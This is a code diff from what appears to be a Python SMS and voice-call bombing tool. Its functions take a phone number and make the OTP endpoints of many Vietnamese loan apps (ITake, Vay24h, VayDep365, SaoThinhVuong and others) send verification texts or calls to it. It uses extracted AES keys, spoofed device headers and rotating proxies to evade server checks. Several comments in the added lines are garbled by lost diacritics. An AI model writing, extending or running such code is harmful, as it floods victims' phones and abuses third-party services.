-# ── EasyOkVN (giống _lt_generic của SenVay/HappyGoo + thêm bước operationRecord/save
-#    kiểu V88Dong, vì sniff cho thấy 2 domain riêng: api.easyokvn.com (gọi thẳng,
-#    UA "24Bot/1 CFNetwork...") và h5.easyokvn.com (gateway path ngẫu nhiên 32 ký tự,
-#    UA Mozilla + hậu tố "easyok", giống hệt _lt_rand_path()/_lt_generic) ──
+#  EasyOkVN (ging _lt_generic ca SenVay/HappyGoo + thm bc operationRecord/save
+#    kiu V88Dong, v sniff cho thy 2 domain ring: api.easyokvn.com (gi thng,
+#    UA "24Bot/1 CFNetwork...") v h5.easyokvn.com (gateway path ngu nhin 32 k t,
+#    UA Mozilla + hu t "easyok", ging ht _lt_rand_path()/_lt_generic) 
 async def _easyok_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
     session_id = "".join(random.choices(string.ascii_lowercase, k=32))
     headers = {
@@ -1106,7 +1113,6 @@ async def _easyok_operation_record_save(client: httpx.AsyncClient, device_id: st
 
 
 async def _easyok_generic(phone: str, is_voice: bool) -> bool:
-    mobile = phone if phone.startswith("0") else ("0" + phone[2:] if phone.startswith("84") else phone)
     device_id = uuid.uuid4().hex
     host = "h5.easyokvn.com"
     app_id = "38"
@@ -1129,7 +1135,7 @@ async def _easyok_generic(phone: str, is_voice: bool) -> bool:
         "deviceId": device_id,
         "platform": "2",
         "token": "",
-        "x_x_path": _vvay_encrypt_path(path),
+        "x_x_path": _vvay_encrypt(path),
         "loginPlatform": "APP",
         "marketToken": "",
         "Accept": "application/json",
@@ -1141,22 +1147,12 @@ async def _easyok_generic(phone: str, is_voice: bool) -> bool:
         "Sec-Fetch-Mode": "cors",
         "Connection": "keep-alive",
     }
-    body = _vvay_encrypt({"phone": mobile, "isVoice": is_voice, "h5": False})
+    body = _vvay_encrypt({"phone": phone, "isVoice": is_voice, "h5": False})
     try:
-        async with _make_client(timeout=20) as client:
+        async with _make_client(timeout=20, proxy=_current_proxy()) as client:
             await _easyok_operation_record_save(client, device_id)
             r = await client.post(f"https://{host}{gw_path}", headers=headers, content=body.encode())
-        if r.status_code == 200:
-            try:
-                d = _vvay_decrypt(r.text.strip())
-            except Exception:
-                print(f"[{label}] ERR không decrypt được response: {r.text[:200]!r}")
-                return False
-            ok = isinstance(d, dict) and (d.get("successful") is True or d.get("code") == 200)
-            if not ok:
-                print(f"[{label}] server từ chối: {d.get('msg') if isinstance(d, dict) else d}")
-            return ok
-        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
+        return r.status_code == 200
     except Exception as e:
         print(f"[{label}] ERR {type(e).__name__}: {e}")
     return False
@@ -1170,282 +1166,191 @@ async def Call_EasyOkVN_Voice(phone):
     return await _easyok_generic(phone, is_voice=True)
 
 
-# ── HappyGoo ──
-async def Call_HappyGoo(phone):
-    return await _lt_generic(phone, False, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")
+_ITAKE_HOST       = "http://h5.6itake-moment.com"
+_ITAKE_GW_PATH    = None  # generated fresh per call; was stale static path causing 401
+_ITAKE_REAL       = "/login/requestVerifyCode"
+_ITAKE_CHECK_PATH = "/h5/urnyb540nnt7xuf08pcw93atdxvaiiv9"
+_ITAKE_CHECK_REAL = "/login/checkPhoneNo"
+# Key/IV ging VVay nhng phi dng compact JSON (khng indent)
+_ITAKE_KEY = b"aajiaozicashmeh5"
+_ITAKE_IV  = b"hajiaozicashmeh5"
 
 
-async def Call_HappyGoo_Voice(phone):
-    return await _lt_generic(phone, True, "h5.6happygoovn.com", "28", "happygoo", "1.0.6_1.8.6")
+def _itake_strip_chunked(text: str) -> str:
+    lines = text.strip().splitlines()
+    out = []
+    for line in lines:
+        s = line.strip()
+        if s and len(s) <= 6 and all(c in "0123456789abcdefABCDEF" for c in s):
+            continue
+        out.append(s)
+    return "".join(out)
 
 
-# ── V88Dong ──
-_V88_BASE    = "https://api.v88dong.com"
-_V88_APP_ID  = "59"
-_V88_VERSION = "1.0.0_0.0.0"
-_V88_UA      = "V88Dong/200 CFNetwork/1568.200.51 Darwin/24.1.0"
+def _itake_enc(obj) -> str:
+    """AES-128-CBC encrypt vi compact JSON (khng indent/space quanh colon)."""
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False) if isinstance(obj, dict) else obj
+    ct  = AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).encrypt(pad(raw.encode(), 16))
+    return base64.b64encode(ct).decode()
 
 
-def _v88_base_headers(device_id: str, x_x_path: str = "") -> dict:
-    headers = {
-        "appId": _V88_APP_ID,
-        "language": "vi-VN",
-        "User-Agent": _V88_UA,
-        "country": "vn",
-        "fpPlatform": "5",
-        "fpDeviceId": device_id,
-        "version": _V88_VERSION,
-        "fingerPrint": "",
-        "deviceId": device_id,
-        "platform": "2",
-        "token": "",
-        "loginPlatform": "APP",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "marketToken": "",
-        "Accept": "*/*",
-        "Content-Type": "application/json",
+def _itake_enc_path(path: str) -> str:
+    p = path.split("?")[0].strip()
+    if not p.startswith("/"): p = "/" + p
+    ct = AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).encrypt(pad(p.encode(), 16))
+    return base64.b64encode(ct).decode()
+
+
+def _itake_dec(text: str):
+    text = _itake_strip_chunked(text)
+    try:
+        ct = base64.b64decode(text)
+        pt = unpad(AES.new(_ITAKE_KEY, AES.MODE_CBC, _ITAKE_IV).decrypt(ct), 16)
+        decoded = pt.decode("utf-8", errors="replace").strip()
+        try:
+            return json.loads(decoded)
+        except Exception:
+            return decoded
+    except Exception:
+        return text
+
+
+def _itake_hdrs(real_path: str) -> dict:
+    return {
+        "Content-Type":  "application/json",
+        "Accept":        "application/json",
         "Accept-Encoding": "identity",
-        "Connection": "keep-alive",
+        "User-Agent": (
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
+            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
+            "Version/18.1 Mobile/15E148 Safari/604.1"
+        ),
+        "appId": "20", "version": "1.0.0_4.0.4", "platform": "2",
+        "loginPlatform": "H5", "fpPlatform": "5", "language": "vi-VN",
+        "x_x_path":    _itake_enc_path(real_path),
+        "fingerPrint": "", "fpDeviceId": "", "deviceId": "",
+        "token": "", "marketToken": "", "country": "",
+        "Referer": f"{_ITAKE_HOST}/login",
+        "Origin": "http://h5.6itake-moment.com/home/loan/apply",
     }
-    if x_x_path:
-        headers["x_x_path"] = x_x_path
-        headers["Accept"] = "application/json"
-    return headers
 
 
-async def _v88_check_side_b_plain(client: httpx.AsyncClient, device_id: str) -> None:
-    headers = {
-        "appId": _V88_APP_ID, "Accept": "*/*", "version": _V88_VERSION,
-        "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "identity",
-        "platform": "2", "token": "", "deviceId": device_id,
-        "User-Agent": _V88_UA, "Content-Type": "application/json",
-    }
+async def Call_ITake(phone: str) -> bool:
+    device_id = hashlib.md5(f"itake_{phone}".encode()).hexdigest()
     try:
-        await client.post(f"{_V88_BASE}/login/check-side-b", headers=headers, content=b"")
-    except Exception:
-        pass
-
-
-async def _v88_operation_record_save(client: httpx.AsyncClient, device_id: str) -> None:
-    session_id = "".join(random.choices(string.ascii_lowercase, k=32))
-    headers = _v88_base_headers(device_id)
-    body = {
-        "operationCode": "app_start_new",
-        "sessionId": session_id,
-        "operationTime": str(int(time.time() * 1000)),
-    }
-    try:
-        await client.post(f"{_V88_BASE}/member/operationRecord/save", headers=headers, json=body)
-    except Exception:
-        pass
-
-
-async def _v88_check_side_b_h5(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
-    gw_path = f"/h5/{device_id}"
-    headers = _v88_base_headers(device_id, _vvay_encrypt_path("/login/check-side-b"))
-    body = _vvay_encrypt({"phone": phone, "deviceId": device_id})
-    try:
-        await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
-    except Exception:
-        pass
-
-
-async def _v88_check_phone_no(client: httpx.AsyncClient, device_id: str, phone: str) -> None:
-    path = "/login/checkPhoneNo"
-    headers = _v88_base_headers(device_id, _vvay_encrypt_path(path))
-    try:
-        await client.get(f"{_V88_BASE}{path}", params={"phone": phone}, headers=headers)
-    except Exception:
-        pass
-
-
-async def _v88_request_verify_code(
-    client: httpx.AsyncClient, device_id: str, phone: str, is_voice: bool
-) -> bool:
-    path = "/login/requestVerifyCode"
-    gw_path = f"/h5/{device_id}"
-    x_x_path = _vvay_encrypt_path(path)
-    body = _vvay_encrypt({"phone": phone, "isVoice": is_voice, "h5": False})
-    headers = _v88_base_headers(device_id, x_x_path)
-    label = "V88Dong Voice" if is_voice else "V88Dong SMS"
-    try:
-        r = await client.post(f"{_V88_BASE}{gw_path}", headers=headers, content=body.encode())
-        if r.status_code == 200:
-            raw = r.text.strip()
-            try:
-                d = _vvay_decrypt(raw)
-            except Exception:
-                print(f"[{label}] ERR phan hoi khong phai base64 hop le: {raw[:200]!r}")
-                return False
-            code = d.get("code") if isinstance(d, dict) else None
-            if code != 200 and isinstance(d, dict):
-                print(f"[{label}] server tu choi: {d.get('msg')}")
-            return code == 200
-        print(f"[{label}] HTTP {r.status_code}: {r.text[:200]!r}")
+        proxy = _current_proxy()
+        # Bootstrap + OTP i qua CNG proxy/IP  server track session theo IP
+        async with httpx.AsyncClient(
+            timeout=40, follow_redirects=True, proxy=proxy
+        ) as client:
+            # 1. Bootstrap session
+            await client.get(
+                f"{_ITAKE_HOST}/login",
+                headers={"User-Agent": _itake_hdrs(_ITAKE_REAL)["User-Agent"],
+                         "Accept": "text/html,application/xhtml+xml,*/*",
+                         "Accept-Encoding": "identity",
+                         "Accept-Language": "vi-VN,vi;q=0.9"},
+            )
+            # 2. Voice (SMS b tt trn server)
+            payload = _itake_enc({
+                "phone": phone, "isVoice": False,
+                "h5": False, "deviceId": device_id,
+            })
+            gw_path = "/h5/" + uuid.uuid4().hex
+            r = await client.post(
+                f"{_ITAKE_HOST}{gw_path}",
+                headers=_itake_hdrs(_ITAKE_REAL),
+                content=payload.encode(),
+            )
+            resp = _itake_dec(r.text)
+            code = resp.get("code") if isinstance(resp, dict) else None
+            ok   = code == 200 and resp.get("successful", False)
+            if ok:
+                print(f"  [ITake Voice] {phone}  {resp.get('msg') or 'OK'}")
+                return True
+            print(f"  [ITake Voice] code={code} msg={resp.get('msg') if isinstance(resp, dict) else resp}")
     except Exception as e:
-        print(f"[{label}] ERR {type(e).__name__}: {e}")
+        print(f"[ITake] ERR {type(e).__name__}: {e}")
     return False
 
 
-async def _v88_send(phone: str, is_voice: bool) -> bool:
-    device_id = uuid.uuid4().hex
-    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
-    async with _make_client(timeout=20) as client:
-        await _v88_check_side_b_plain(client, device_id)
-        await _v88_operation_record_save(client, device_id)
-        await _v88_check_side_b_h5(client, device_id, mobile)
-        await _v88_check_phone_no(client, device_id, mobile)
-        return await _v88_request_verify_code(client, device_id, mobile, is_voice)
 
+#  H5 helpers (SaoThinhVuong, UVWallet, Vay24h family) 
+_H5_TIMESTAMP = str(int(time.time() * 1000))
+_H5_SIGN = hashlib.md5(_H5_TIMESTAMP.encode()).hexdigest()
+_H5_IMEI = hashlib.md5(str(random.random()).encode()).hexdigest()
+_H5_UA = (
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
+    "AppleWebKit/605.1.15 (KHTML, like Gecko) "
+    "Version/18.1 Mobile/15E148 Safari/604.1"
+)
 
-async def Call_V88Dong(phone):
-    return await _v88_send(phone, is_voice=False)
-
-
-async def Call_V88DongVoice(phone):
-    return await _v88_send(phone, is_voice=True)
-
-
-# ── ITake ──
-_ITAKE_BASE = "https://h5.6itake-moment.com"
-
-
-async def Call_ITake(phone):
-    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
-    device_id = uuid.uuid4().hex
-    check_id  = uuid.uuid4().hex
-    base_h = {
-        "fpPlatform": "5", "appId": "20", "language": "vi-VN",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-        "Referer": f"{_ITAKE_BASE}/login", "country": "undefined",
-        "fpDeviceId": device_id, "deviceId": device_id, "version": "1.0.0_4.0.4",
-        "fingerPrint": "", "platform": "2", "token": "undefined",
-        "loginPlatform": "H5", "marketToken": "undefined",
-        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors", "Accept-Language": "vi-VN,vi;q=0.9",
-        "Accept-Encoding": "identity",
-    }
-    get_h  = {**base_h, "Accept": "*/*", "x_x_path": _vvay_encrypt_path("/login")}
-    post_h = {
-        **base_h, "Accept": "application/json", "Content-Type": "application/json",
-        "Origin": _ITAKE_BASE, "x_x_path": _vvay_encrypt_path("/login/requestVerifyCode"),
-    }
-    body = _vvay_encrypt({"phone": mobile, "isVoice": True, "h5": False, "deviceId": device_id})
-    try:
-        async with _make_client(timeout=20) as client:
-            await client.get(
-                f"{_ITAKE_BASE}/h5/{check_id}", headers=get_h, params={"phone": mobile}
-            )
-            r = await client.post(
-                f"{_ITAKE_BASE}/h5/{device_id}", headers=post_h, content=body.encode()
-            )
-        try:
-            resp = _vvay_decrypt(r.text)
-            ok = resp.get("successful") is True or resp.get("code") == 200
-            if ok:
-                print(f"[ITake] ✅ OK")
-            else:
-                print(f"[ITake] ❌ {resp.get('msg') or r.text[:100]}")
-        except Exception:
-            ok = r.status_code == 200
-            print(f"[ITake] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
-        return ok
-    except Exception as e:
-        print(f"[ITake] ERR {type(e).__name__}: {e}")
-        return False
-
-
-
-_VNCREDIT_KEY = b"tdbdif7653scbvy4"
-_VNCREDIT_DEVICE_IDS: dict = {}
-
-
-def _vncredit_encrypt(data: dict) -> dict:
-    raw = json.dumps(data, separators=(",", ":")).encode()
-    enc = base64.b64encode(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).encrypt(pad(raw, 16))).decode()
-    return {"JXTbpertIbc": enc}
-
-
-def _vncredit_decrypt(resp_json: dict) -> dict:
-    try:
-        enc = resp_json.get("JXTbpertIbc", "")
-        raw = base64.b64decode(enc)
-        return json.loads(unpad(AES.new(_VNCREDIT_KEY, AES.MODE_ECB).decrypt(raw), 16).decode())
-    except Exception:
-        return resp_json
-
-
-def _vncredit_device_id(phone: str) -> str:
-    if phone not in _VNCREDIT_DEVICE_IDS:
-        _VNCREDIT_DEVICE_IDS[phone] = str(random.randint(10000000, 99999999))
-    return _VNCREDIT_DEVICE_IDS[phone]
-
-
-def _vncredit_headers(phone: str) -> dict:
+def _h5_headers() -> dict:
     return {
-        "Content-Type": "application/json",
-        "arHZCqdXMe": "",
-        "DJDVItHEOpT": "",
-        "TcJSztVvHI": "in",
-        "vMdkYlySgyVn": "cn.ivay.h5.viet",
-        "BCCpGTCULBU": _vncredit_device_id(phone),
-        "xAfAyxfEVv": "",
-        "oqBfkSWOjSw": "1",
-        "fbcId": "",
-        "User-Agent": (
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) "
-            "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1"
-        ),
+        "Accept":           "application/json, text/plain, */*",
+        "Content-Type":     "application/json;charset=utf-8",
+        "Content-Language": "vn",
+        "system":           "ios",
+        "user-agent":       _H5_UA,
+        "deviceType":       "h5",
+        "w":                "1170",
+        "h":                "2532",
+        "appcodename":      "Mozilla",
+        "appname":          "Netscape",
+        "appversion":       _H5_UA,
+        "platform":         "iPhone",
+        "vendor":           "Apple Computer, Inc.",
+        "screenresolution": "1170,2532",
     }
 
+def _h5_body(phone: str, pkg_name: str, sms_type: int = 2) -> dict:
+    return {
+        "phone":       phone,
+        "type":        sms_type,
+        "timestamp":   int(time.time() * 1000),
+        "referrer":    "utm_source=null",
+        "af_prt":      None,
+        "sign":        _H5_SIGN,
+        "appversion":  "1.0.0",
+        "channel":     "1",
+        "trackerName": "H5",
+        "app_version": "1.0.0",
+        "version":     "1.0.0",
+        "imei":        _H5_IMEI,
+        "uuid":        _H5_IMEI,
+        "pkg_name":    pkg_name,
+    }
 
-async def Call_VnCreSms(phone):
+async def _h5_send(phone: str, base: str, pkg_name: str, label: str, sms_type: int = 2):
     try:
-        ts = str(int(time.time() * 1000))
-        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
-        async with httpx.AsyncClient(timeout=20, verify=False) as client:
-            r = await client.post(
-                "https://api.tmdv.vn/mkydnfCwIW/GOifgUPDRz",
-                json=_vncredit_encrypt({"mobile": phone, "type": "1"}),
-                headers=headers,
+        async with httpx.AsyncClient(timeout=15, follow_redirects=True) as c:
+            r = await c.post(
+                f"{base}/api/register/app/sendSms",
+                headers=_h5_headers(),
+                json=_h5_body(phone, pkg_name, sms_type),
             )
-        d = _vncredit_decrypt(r.json())
-        ok = d.get("code") == 0
-        if ok:
-            print(f"[VNCredit-SMS] ✅ OK")
-        else:
-            print(f"[VNCredit-SMS] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
-        return ok
-    except Exception as e:
-        print(f"[VNCredit-SMS] ERR {type(e).__name__}: {e}")
+            d = r.json()
+            if str(d.get("code", "")) == "200":
+                print(f"  {label}")
+            return r.status_code == 200
+    except Exception:
         return False
 
 
-async def Call_VNCreCall(phone):
-    try:
-        ts = str(int(time.time() * 1000))
-        headers = {**_vncredit_headers(phone), "arHZCqdXMe": ts, "xAfAyxfEVv": phone}
-        async with httpx.AsyncClient(timeout=20, verify=False) as client:
-            r = await client.post(
-                "https://api.tmdv.vn/mkydnfCwIW/vCqfJYeweB",
-                json=_vncredit_encrypt({"mobile": phone, "type": "2"}),
-                headers=headers,
-            )
-        d = _vncredit_decrypt(r.json())
-        ok = d.get("code") == 0
-        if ok:
-            print(f"[VNCredit-Voice] ✅ OK")
-        else:
-            print(f"[VNCredit-Voice] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
-        return ok
-    except Exception as e:
-        print(f"[VNCredit-Voice] ERR {type(e).__name__}: {e}")
-        return False
+async def saothinhvuong(phone: str):
+    await _h5_send(phone, "https://h5.saothinhvuong.cc", "com.loan.starwarsh5ios", "SaoThinhVuong")
+
+async def saothinhvuong_sms(phone: str):
+    await _h5_send(phone, "https://h5.saothinhvuong.cc", "com.loan.starwarsh5ios", "SaoThinhVuong SMS", sms_type=1)
+
+async def random_sao(phone):
+    await random.choice([saothinhvuong, saothinhvuong_sms])(phone)
 
 
 
-# ── Vay24h ──
-_VAY24H_AES_KEY  = b"5vB8^yC1&zF3*hJ9"
+
+#  Vay24h 
+_VAY24H_AES_KEY  = b"9mN4#kL2@xR7!pD6"
 _VAY24H_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
 _VAY24H_AES_PKG  = "com.loan.uvwalleth5ios"
 _VAY24H_AES_BASE = "https://h5.vay24h.vip"
@@ -1494,39 +1399,41 @@ def _vay24h_common(imei: str) -> dict:
 
 async def Call_Vay24h(phone):
     imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
-    ts = int(time.time() * 1000)
-    sign = hashlib.md5(str(ts).encode()).hexdigest()
     try:
-        async with httpx.AsyncClient(timeout=30, verify=False) as client:
-            body = {
-                "phone": phone, "type": 2, "timestamp": ts,
-                "referrer": "utm_source=null", "af_prt": None, "sign": sign,
-                "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
-                "version": "1.0.0", "imei": imei, "uuid": imei,
-                "pkg_name": _VAY24H_AES_PKG,
-            }
-            r = await client.post(
-                f"{_VAY24H_AES_BASE}/api/register/app/sendSms",
+        async with _make_client(timeout=30) as client:
+            r1 = await client.post(
+                f"{_VAY24H_AES_BASE}/api/comm/downoknotify",
                 headers=_VAY24H_AES_HDRS,
-                json=body,
+                json={**_vay24h_common(imei), "type": 1},
+            )
+            d1 = {}
+            try:
+                d1 = r1.json()
+            except Exception:
+                pass
+            if d1.get("code") not in ("200", 200):
+                return False
+            enc_data = _vay24h_aes_enc({
+                "phone": phone, "type": "2",
+                "pkg_name": _VAY24H_AES_PKG, "voice": "0", "reApply": "",
+            })
+            r2 = await client.post(
+                f"{_VAY24H_AES_BASE}/api/register/h5/sendSms",
+                headers=_VAY24H_AES_HDRS,
+                json={"encryptedData": enc_data, "pkg_name": _VAY24H_AES_PKG},
             )
             try:
-                d = r.json()
-                ok = str(d.get("code", "")) in ("200", "0") or d.get("code") in (200, 0)
-                if ok:
-                    print(f"[Vay24h] ✅ OK")
-                else:
-                    print(f"[Vay24h] ❌ {d.get('message') or d.get('msg') or r.text[:100]}")
+                d2 = r2.json()
+                ok = str(d2.get("code", "")) in ("200", "0") or d2.get("code") in (200, 0)
             except Exception:
-                ok = r.status_code == 200
-                print(f"[Vay24h] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
+                ok = r2.status_code == 200
             return ok
     except Exception as e:
         print(f"[Vay24h] ERR {type(e).__name__}: {e}")
         return False
 
 
-# ── VayDep365 ──
+#  VayDep365 
 _VAYDEP_AES_KEY  = b"8fA2#kD9!xL7@mN3"
 _VAYDEP_AES_SIGN = "0f656af82eb1da33221a06d1171db265"
 _VAYDEP_AES_PKG  = "com.vch.vaychungh5ios"
@@ -1583,7 +1490,7 @@ def _vaydep_aes_common(imei: str) -> dict:
 async def Call_VayDep365(phone):
     imei = hashlib.md5(uuid.uuid4().bytes).hexdigest()
     try:
-        async with httpx.AsyncClient(timeout=30, http2=False, verify=False) as client:
+        async with httpx.AsyncClient(timeout=30, http2=False, proxy=_current_proxy()) as client:
             r1 = await client.post(
                 f"{_VAYDEP_AES_BASE}/api/comm/downoknotify",
                 headers=_VAYDEP_AES_HDRS,
@@ -1611,88 +1518,10 @@ async def Call_VayDep365(phone):
         return False
 
 
-# ── UVWallet / SaoThinhVuong (cùng pattern Vay24h-ECB) ──
-async def Call_UVWallet(phone):
-    try:
-        headers = {
-            "User-Agent": random.choice(_XMH_UA_POOL),
-            "deviceType": "h5", "channel": "",
-            "appversion": random.choice(_XMH_UA_POOL),
-            "vendor": "Apple Computer, Inc.",
-            "Origin": "https://h5.uvwalletvn.com",
-            "Referer": "https://h5.uvwalletvn.com/login",
-            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
-            "Sec-Fetch-Site": "same-origin", "w": "1170",
-            "appname": "Netscape", "platform": "iPhone",
-            "appcodename": "Mozilla", "screenresolution": "1170,2532",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json;charset=utf-8",
-            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "identity", "Connection": "keep-alive",
-        }
-        ts   = int(time.time() * 1000)
-        imei = hashlib.md5(str(random.random()).encode()).hexdigest()
-        sign = hashlib.md5(str(ts).encode()).hexdigest()
-        body = {
-            "phone": phone, "type": 2, "timestamp": ts,
-            "referrer": "utm_source=null", "af_prt": None, "sign": sign,
-            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
-            "version": "1.0.0", "imei": imei, "uuid": imei,
-            "pkg_name": "com.loan.uvwalleth5ios",
-        }
-        async with _make_client() as client:
-            r = await client.post(
-                "https://h5.uvwalletvn.com/api/register/app/sendSms",
-                headers=headers, json=body,
-            )
-        return r.status_code == 200
-    except Exception as e:
-        print(f"[UVWallet] ERR {type(e).__name__}: {e}")
-        return False
+#  UVWallet / SaoThinhVuong (cng pattern Vay24h-ECB) 
 
 
-async def Call_SaoThinhVuong(phone):
-    try:
-        headers = {
-            "User-Agent": random.choice(_XMH_UA_POOL),
-            "deviceType": "h5", "channel": "",
-            "appversion": random.choice(_XMH_UA_POOL),
-            "vendor": "Apple Computer, Inc.",
-            "Origin": "https://h5.saothinhvuong.cc",
-            "Referer": "https://h5.saothinhvuong.cc/login",
-            "Sec-Fetch-Dest": "empty", "h": "2532", "system": "ios",
-            "Sec-Fetch-Site": "same-origin", "w": "1170",
-            "appname": "Netscape", "platform": "iPhone",
-            "appcodename": "Mozilla", "screenresolution": "1170,2532",
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json;charset=utf-8",
-            "Content-Language": "vn", "Sec-Fetch-Mode": "cors",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "identity", "Connection": "keep-alive",
-        }
-        ts16   = int(time.time() * 1000)
-        imei16 = hashlib.md5(str(random.random()).encode()).hexdigest()
-        sign16 = hashlib.md5(str(ts16).encode()).hexdigest()
-        body = {
-            "phone": phone, "type": 2, "timestamp": ts16,
-            "referrer": "utm_source=null", "af_prt": None, "sign": sign16,
-            "appversion": "1.0.0", "channel": "1", "app_version": "1.0.0",
-            "version": "1.0.0", "imei": imei16, "uuid": imei16,
-            "pkg_name": "com.loan.starwarsh5ios",
-        }
-        async with _make_client() as client:
-            r = await client.post(
-                "https://h5.saothinhvuong.cc/api/register/app/sendSms",
-                headers=headers, json=body,
-            )
-        return r.status_code == 200
-    except Exception as e:
-        print(f"[SaoThinhVuong] ERR {type(e).__name__}: {e}")
-        return False
-
-
-_MUAVAY_AES_KEY = b"IYFlUR+o0ec3uRlg2fhUzQ=="  # 24 bytes → AES-192
+_MUAVAY_AES_KEY = b"IYFlUR+o0ec3uRlg2fhUzQ=="  # 24 bytes  AES-192
 
 
 def _muavay_enc(data: dict) -> str:
@@ -1711,178 +1540,6 @@ def _muavay_dec(b64_cipher: str) -> dict:
         return {}
 
 
-async def Call_MuaVayLoan(phone):
-    try:
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "language": "vi_vn", "appType": "1", "osType": "1",
-            "Origin": "https://www.muavayloan.top",
-            "Referer": "https://www.muavayloan.top/",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "identity", "Connection": "keep-alive",
-        }
-        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Mua_Vay"})}
-        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
-            r = await client.post(
-                "https://www.muavayloan.top/app-gateway/api/operator/opt/send",
-                headers=headers, json=body,
-            )
-        d = {}
-        try:
-            outer = r.json()
-            d = _muavay_dec(outer["key"]) if "key" in outer else outer
-            code = d.get("code")
-            ok = d.get("ok") is True or code == 1 or str(code) in ("200", "0")
-        except Exception:
-            ok = r.status_code == 200
-        if ok:
-            print(f"[MuaVayLoan] ✅ OK")
-        else:
-            msg = d.get("message") or d.get("msg") or r.text[:100]
-            print(f"[MuaVayLoan] ❌ {msg}")
-        return bool(ok)
-    except Exception as e:
-        print(f"[MuaVayLoan] ERR {type(e).__name__}: {e}")
-        return False
-
-
-async def Call_MoneyCashLoan(phone):
-    try:
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "language": "vi_vn", "appType": "1", "osType": "1",
-            "Origin": "http://www.moneycashloan.top",
-            "Referer": "http://www.moneycashloan.top/",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "identity", "Connection": "keep-alive",
-        }
-        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Money_Cash"})}
-        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
-            r = await client.post(
-                "http://www.moneycashloan.top/app-gateway/api/operator/opt/send",
-                headers=headers, json=body,
-            )
-        d = {}
-        try:
-            d = _muavay_dec(r.json().get("key", ""))
-            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
-        except Exception:
-            ok = r.status_code == 200
-        if ok:
-            print(f"[MoneyCashLoan] ✅ OK")
-        else:
-            msg = d.get("message") or d.get("msg") or r.text[:100]
-            print(f"[MoneyCashLoan] ❌ {msg}")
-        return bool(ok)
-    except Exception as e:
-        print(f"[MoneyCashLoan] ERR {type(e).__name__}: {e}")
-        return False
-
-
-async def Call_NganNgan(phone):
-    try:
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "language": "vi_vn", "appType": "1", "osType": "1",
-            "Origin": "http://www.nganngan.top",
-            "Referer": "http://www.nganngan.top/",
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-            "Accept-Language": "vi-VN,vi;q=0.9",
-            "Accept-Encoding": "identity", "Connection": "keep-alive",
-        }
-        body = {"key": _muavay_enc({"smsType": "1", "phone": phone, "loanProductName": "Ngan_Vay"})}
-        async with httpx.AsyncClient(timeout=20, http2=False, verify=False) as client:
-            r = await client.post(
-                "http://www.nganngan.top/app-gateway/api/operator/opt/send",
-                headers=headers, json=body,
-            )
-        d = {}
-        try:
-            d = _muavay_dec(r.json().get("key", ""))
-            ok = d.get("ok") is True or d.get("code") in (1, 200, "200", "0")
-        except Exception:
-            ok = r.status_code == 200
-        if ok:
-            print(f"[NganNgan] ✅ OK")
-        else:
-            msg = d.get("message") or d.get("msg") or r.text[:100]
-            print(f"[NganNgan] ❌ {msg}")
-        return bool(ok)
-    except Exception as e:
